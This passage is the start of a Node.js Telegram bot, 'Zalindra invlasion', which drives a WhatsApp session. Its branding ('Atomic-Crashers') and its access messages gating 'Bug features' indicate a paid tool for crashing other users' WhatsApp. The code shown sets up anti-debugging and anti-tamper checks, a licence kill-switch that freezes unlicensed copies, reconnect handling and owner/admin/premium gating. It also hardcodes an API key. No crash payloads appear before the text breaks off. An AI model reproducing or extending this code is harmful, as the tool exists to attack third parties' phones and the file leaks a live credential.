
'use strict';

// ─── Capture genuine exit, sekali, paling awal ────────────────────────────────
// Semua blok di bawah WAJIB pakai _hardExit ini, jangan panggil process.exit langsung,
// supaya tidak ada referensi tercecer yang bisa di-mock terpisah.
const _hardExit = Object.freeze(process.exit.bind(process));

// ─── Anti-Preload ─────────────────────────────────────────────────────────────
// HARUS jalan PERTAMA, sebelum require apapun.
// Tujuan: blok --require, --loader, --inspect, dan non-npm-start.
;(function _antiPreload() {
    // Flag Node.js yang dilarang
    const _banned = [
        '--require', '-r',
        '--loader', '--experimental-loader', '--import',
        '--inspect', '--inspect-brk', '--inspect-port',
        '--experimental-vm-modules', '--expose-internals'
    ];
    for (const arg of process.execArgv) {
        const low = arg.toLowerCase();
        for (const b of _banned) {
            if (low === b || low.startsWith(b + '=') || low.startsWith(b + ' ')) {
                _hardExit(1); for (;;) {}
            }
        }
    }

    // Block NODE_OPTIONS yang mengandung preload / inspect
    const _no = (process.env.NODE_OPTIONS || '').toLowerCase();
    if (_no.includes('--require') || _no.includes('-r ') ||
        _no.includes('--loader')  || _no.includes('--inspect') ||
        _no.includes('--import')) {
        try { delete process.env.NODE_OPTIONS; } catch (_) {}
        _hardExit(1); for (;;) {}
    }

    // Hanya boleh jalan via npm start
    const _ev     = process.env.npm_lifecycle_event;
    const _script = process.env.npm_lifecycle_script;
    const _pkg    = process.env.npm_package_name;
    if (_ev !== 'start' || !_script || !_pkg) { _hardExit(1); for (;;) {} }
})();

// ─── HTTPS Snapshot ───────────────────────────────────────────────────────────
// Langsung setelah require — tangkap referensi asli sebelum kode lain bisa override.
// _httpsGet ini dipakai oleh fetchValidTokens() untuk request ke database lisensi,
// supaya request kritis tidak lewat axios yang bisa di-monkey-patch terpisah.
const _httpsGet = (function _snapshotHttps() {
    const https = require('https');

    // Verifikasi https adalah built-in Node, bukan override dari file
    try {
        if (require.resolve('https') !== 'https') { _hardExit(1); for (;;) {} }
    } catch { _hardExit(1); for (;;) {} }

    // Properti kritis harus ada
    if (typeof https.get     !== 'function' ||
        typeof https.request !== 'function' ||
        typeof https.globalAgent === 'undefined') { _hardExit(1); for (;;) {} }

    // Verifikasi tidak ada Proxy wrapper (tanda mock/intercept)
    const sig = Function.prototype.toString.call(https.get);
    if (sig.includes('Proxy') || sig.includes('() => ') || sig.includes('resolve(')) { _hardExit(1); for (;;) {} }

    // Freeze referensi — tidak bisa di-replace setelah ini
    return Object.freeze(https.get.bind(https));
})();

// ─── Anti-Debugger ───────────────────────────────────────────────────────────
;(function _antiDbg() {
    setInterval(() => {
        const t = performance.now();
        debugger;
        if (performance.now() - t > 150) { _hardExit(9); for (;;) {} }
    }, 3000);
})();

// ─── Lock process.exit ───────────────────────────────────────────────────────
;(function _lockExit() {
    try {
        Object.defineProperty(process, 'exit', {
            value: _hardExit, writable: false, configurable: false, enumerable: true
        });
    } catch (_) {}
    setInterval(() => {
        try {
            const s = process.exit.toString();
            if (s.includes('Proxy') || s.includes('function () {}') || s.includes('return;')) {
                _hardExit(1); for (;;) {}
            }
        } catch (_) { _hardExit(1); for (;;) {} }
    }, 3000);
})();

const { Telegraf, Markup, session } = require("telegraf");
const JavaScriptObfuscator = require("javascript-obfuscator");
const fs = require("fs");
const vm = require("vm");
const os = require("os");
const chalk = require("chalk");
const REMOVE_BG_KEY = "3xj8BCNe5dWNejWDvqXWtgRK";
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@zeppeliorg/wbails");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const CMD_FILE = "./Tools/cmdmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const startTime = Date.now();
const mediaMode = new Map(); 
const userCooldown = new Map();
const verifiedUsers = new Set();
const userState = {};
const liveIntervals = {};

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
/// ------- ///
function isCooldown(userId, delay = 1500) {
  const now = Date.now();

  if (userCooldown.has(userId)) {
    const last = userCooldown.get(userId);

    if (now - last < delay) {
      return true;
    }
  }

  userCooldown.set(userId, now);
  return false;
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function getRuntime() {
  const now = Date.now();
  const diff = now - startTime;

  const seconds = Math.floor(diff / 1000) % 60;
  const minutes = Math.floor(diff / (1000 * 60)) % 60;
  const hours = Math.floor(diff / (1000 * 60 * 60)) % 24;
  const days = Math.floor(diff / (1000 * 60 * 60 * 24));

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}
/// ---------- GITHUB ------------ ///
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/seanfutsalmin-beep/Seannn/refs/heads/main/token.json";

// (JANGAN DIUBAH)
const INTEGRITY_SECRET = "ATOMIC_R9X_ULTRA_SECRET_" + "SHIELD".repeat(100);

axios.defaults.headers.common = {
  "User-Agent": "Atomic-Crashers-Secure-Client/17.00",
  "X-Atomic-Protection": crypto.createHash("sha256").update(INTEGRITY_SECRET).digest("hex"),
  "Cache-Control": "no-cache, no-store, must-revalidate",
  "Pragma": "no-cache",
  "Expires": "0"
};

axios.defaults.timeout = 10000;
axios.defaults.maxRedirects = 0;


Object.freeze(axios.defaults.headers.common);
Object.freeze(axios.defaults);

const TOKEN_LIST_MAX_BYTES = 5 * 1024 * 1024; // batas wajar untuk token.json, cegah body bomb

function fetchValidTokens() {
  return new Promise(resolve => {
    let settled = false;
    const done = value => {
      if (settled) return;
      settled = true;
      resolve(value);
    };
    const fail = () => {
      console.log(chalk.red("❌ Gagal mengambil token: Koneksi terputus atau data tidak sah"));
      done([]);
    };

    let req;
    try {
      req = _httpsGet(GITHUB_TOKEN_LIST_URL, {
        timeout: 10000,
        headers: {
          "User-Agent": "Atomic-Crashers-Secure-Client/17.00",
          "X-Atomic-Protection": crypto.createHash("sha256").update(INTEGRITY_SECRET).digest("hex"),
          "Cache-Control": "no-cache, no-store, must-revalidate",
          "Pragma": "no-cache",
          "Expires": "0"
        }
      }, res => {
        if (res.statusCode !== 200) {
          res.resume();
          return fail();
        }

        let body = "";
        let bytes = 0;
        res.setEncoding("utf8");
        res.on("data", chunk => {
          bytes += Buffer.byteLength(chunk);
          if (bytes > TOKEN_LIST_MAX_BYTES) {
            req.destroy();
            return fail();
          }
          body += chunk;
        });
        res.on("end", () => {
          try {
            if (!body || body.length < 10) {
              throw new Error("Data rusak atau dimanipulasi");
            }
            const data = JSON.parse(body);
            done(Array.isArray(data.tokens) ? data.tokens : []);
          } catch (_) {
            fail();
          }
        });
        res.on("error", fail);
      });
    } catch (_) {
      return fail();
    }

    req.on("timeout", () => { req.destroy(); fail(); });
    req.on("error", fail);
  });
}

// token.json di GitHub sekarang isinya double-hash (sha256 lalu md5), bukan token mentah.
// Harus persis sama dengan hashToken() di db.js (sisi yang nulis token.json).
function hashToken(token) {
  const sha = crypto.createHash("sha256").update(String(token || "")).digest("hex");
  return crypto.createHash("md5").update(sha).digest("hex");
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa keaslian token..."));


  const validHashes = await fetchValidTokens();

  if (!validHashes.length) {
    console.log(chalk.red(`
❌ DATABASE TOKEN TIDAK DAPAT DIAKSES / KOSONG
    `));
    freezeProcess();
  } else {
    const botTokenHash = hashToken(BOT_TOKEN);
    const isTokenValid = validHashes.includes(botTokenHash);

    if (!isTokenValid) {
      console.log(chalk.red("❌ TOKEN TIDAK TERDAFTAR ATAU SUDAH DICABUT AKSES"));
      freezeProcess();
    } else {
      console.log(chalk.green("✅ Token terverifikasi • Keamanan aktif"));

      setInterval(async () => {
        const freshHashes = await fetchValidTokens();
        const stillValid = freshHashes.includes(botTokenHash);
        if (!stillValid) {
          console.log(chalk.red("⚠️ TOKEN SUDAH TIDAK SAH • MEMATIKAN SISTEM"));
          freezeProcess();
        }
      }, 30000);

      startBot();
    }
  }
}

function freezeProcess() {
  for (;;);
}

function startBot() {
  console.log(chalk.cyan(`⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
☇ Creator : @seanoffc
☇ Name Script : Zalindra invlasion
☇ Version : 17.0.0
  
Bot Berhasil Terhubung • Gunakan Script Sebrutal Mungkin`));
}

validateToken();

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(chalk.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀
» Information:
☇ Creator : @seanoffc
☇ Name Script : Zalindra invlasion
☇ Version : 17.0.0
☇ Bot Connect
`));

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    //console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        //console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
» Information:
☇ Creator : @seanoffc
☇ Name Script : Zalindra invlasion
☇ Version : 16.0.0
☇ Bot Connect
☇ WhatsApp Number : ${linkedWhatsAppNumber}
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`<pre>⬡═―⊱「 𝚣𝚊𝚕𝚒𝚗𝚍𝚛𝚊 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ    Number : ${linkedWhatsAppNumber}
ϟ    Status : Connected
</pre>`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          //console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          //console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp belum connect, /connect dulu");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
//////////////////////////////////////
let ownerUsers = loadOwner() || [];
let premiumUsers = loadJSON(premiumFile) || [];
let adminList = [];
let whitelistGroups = loadSafe() || [];
loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from?.id?.toString();
  const name = ctx.from?.first_name || "User";

  if (!ownerUsers.includes(id)) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>❌ AKSES DI TOLAK OWNER ONLY

⚠️ Fitur ini khusus OWNER ONLY

👤 User : ${name}</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/seanoffc")]
        ])
      }
    );
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id) && id != "8221502831"
  ) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Admin before using Bug features ✦</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/seanoffc")]
        ])
      }
    );
  }

  return next();
};
/// ---- PREMIUM ---- ///
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (premiumUsers.includes(id)) {
    return next();
  }

  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Premium before using Bug features ✦</pre>`,
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("Owner", "https://t.me/seanoffc")]
      ])
    }
  );
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
